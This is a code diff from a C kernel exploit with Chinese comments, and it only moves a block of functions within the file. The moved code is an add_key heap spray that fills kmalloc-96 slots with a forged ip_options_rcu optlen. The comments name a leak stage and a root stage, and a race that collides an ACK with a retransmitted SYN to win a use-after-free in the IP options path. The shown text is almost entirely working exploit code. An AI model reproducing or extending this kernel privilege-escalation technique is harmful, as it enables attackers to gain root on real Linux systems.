@@ -247,6 +247,60 @@ static void spray_free(void) {
     g_spray_n = 0;
 }
 
+/* 竞态用的喷淋源。
+ *
+ * leak 阶段用 IP_OPTIONS：只能写 40 字节，覆盖不到 optlen（+0x18），
+ * 所以只适合“确认槽位被复用”。
+ * root 阶段用 add_key：datalen=72 时 0x18+72=96 落 kmalloc-96，且
+ * data[0] 正好压在 optlen 上，能构造出“第二次读到大 optlen”的条件。 */
+enum spray_kind { SPRAY_IPOPT, SPRAY_KEY };
+static enum spray_kind g_spray_kind = SPRAY_IPOPT;
+static uint8_t g_fake_optlen = 40;
+
+/* ---- add_key 喷射 ----
+ *
+ * 每个 key 占一个 kmalloc-96 槽位。key 本身要留在 keyring 里，槽位才不被
+ * 立刻释放，所以喷完不能马上 unlink —— 留到进程退出再说。 */
+static int32_t g_keys[KEY_SPRAY_N];
+static int g_key_n;
+
+static int key_spray(uint8_t fake_optlen, uint32_t tag) {
+    uint8_t payload[KEY_DATALEN];
+    memset(payload, 0, sizeof(payload));
+    payload[0] = fake_optlen;                 /* → ip_options_rcu.optlen */
+    payload[1] = 0x01;                        /* srr：让 ip_options_build 走 RR 分支 */
+    payload[2] = 0x01;                        /* rr  */
+    /* __data 从 payload[8] 开始，对应 ip_options_rcu+0x20 */
+    memcpy(payload + 8, &tag, 4);
+
+    int made = 0;
+    for (int i = 0; i < KEY_SPRAY_N && g_key_n < KEY_SPRAY_N; i++) {
+        static unsigned seq;
+        char desc[32];
+        snprintf(desc, sizeof(desc), "synopt-%d-%u", (int)getpid(), seq++);
+        long r = syscall(__NR_add_key, "user", desc, payload, (size_t)KEY_DATALEN,
+                         KEY_SPEC_PROCESS_KEYRING);
+        if (r < 0) {
+            if (errno == ENOSYS || errno == EACCES || errno == EPERM) {
+                say("[key] add_key 不可用（errno=%d），这条喷射路径走不通", errno);
+                return -1;
+            }
+            continue;
+        }
+        g_keys[g_key_n++] = (int32_t)r;
+        made++;
+    }
+    return made;
+}
+
+static void key_spray_free(void) {
+    /* KEYCTL_UNLINK = 9（不是 3；3 是 KEYCTL_READ）。参数：key, keyring */
+    for (int i = 0; i < g_key_n; i++) {
+        syscall(__NR_keyctl, 9 /* KEYCTL_UNLINK */, g_keys[i], KEY_SPEC_PROCESS_KEYRING);
+    }
+    g_key_n = 0;
+}
+
 /* 持续占位。
  *
  * 单发一次喷淋几乎不可能命中：被释放的槽位必须在 ip_build_and_send_pkt
@@ -458,60 +512,6 @@ static int find_text_candidates(const struct synack *s, uint64_t *out, int max) 
         out[n++] = v;
     }
     return n;
-}
-
-/* 竞态用的喷淋源。
- *
- * leak 阶段用 IP_OPTIONS：只能写 40 字节，覆盖不到 optlen（+0x18），
- * 所以只适合“确认槽位被复用”。
- * root 阶段用 add_key：datalen=72 时 0x18+72=96 落 kmalloc-96，且
- * data[0] 正好压在 optlen 上，能构造出“第二次读到大 optlen”的条件。 */
-enum spray_kind { SPRAY_IPOPT, SPRAY_KEY };
-static enum spray_kind g_spray_kind = SPRAY_IPOPT;
-static uint8_t g_fake_optlen = 40;
-
-/* ---- add_key 喷射 ----
- *
- * 每个 key 占一个 kmalloc-96 槽位。key 本身要留在 keyring 里，槽位才不被
- * 立刻释放，所以喷完不能马上 unlink —— 留到进程退出再说。 */
-static int32_t g_keys[KEY_SPRAY_N];
-static int g_key_n;
-
-static int key_spray(uint8_t fake_optlen, uint32_t tag) {
-    uint8_t payload[KEY_DATALEN];
-    memset(payload, 0, sizeof(payload));
-    payload[0] = fake_optlen;                 /* → ip_options_rcu.optlen */
-    payload[1] = 0x01;                        /* srr：让 ip_options_build 走 RR 分支 */
-    payload[2] = 0x01;                        /* rr  */
-    /* __data 从 payload[8] 开始，对应 ip_options_rcu+0x20 */
-    memcpy(payload + 8, &tag, 4);
-
-    int made = 0;
-    for (int i = 0; i < KEY_SPRAY_N && g_key_n < KEY_SPRAY_N; i++) {
-        static unsigned seq;
-        char desc[32];
-        snprintf(desc, sizeof(desc), "synopt-%d-%u", (int)getpid(), seq++);
-        long r = syscall(__NR_add_key, "user", desc, payload, (size_t)KEY_DATALEN,
-                         KEY_SPEC_PROCESS_KEYRING);
-        if (r < 0) {
-            if (errno == ENOSYS || errno == EACCES || errno == EPERM) {
-                say("[key] add_key 不可用（errno=%d），这条喷射路径走不通", errno);
-                return -1;
-            }
-            continue;
-        }
-        g_keys[g_key_n++] = (int32_t)r;
-        made++;
-    }
-    return made;
-}
-
-static void key_spray_free(void) {
-    /* KEYCTL_UNLINK = 9（不是 3；3 是 KEYCTL_READ）。参数：key, keyring */
-    for (int i = 0; i < g_key_n; i++) {
-        syscall(__NR_keyctl, 9 /* KEYCTL_UNLINK */, g_keys[i], KEY_SPEC_PROCESS_KEYRING);
-    }
-    g_key_n = 0;
 }
 
 /* 竞态：一边持续喷淋占位，一边把 ACK 与重传 SYN 对撞。
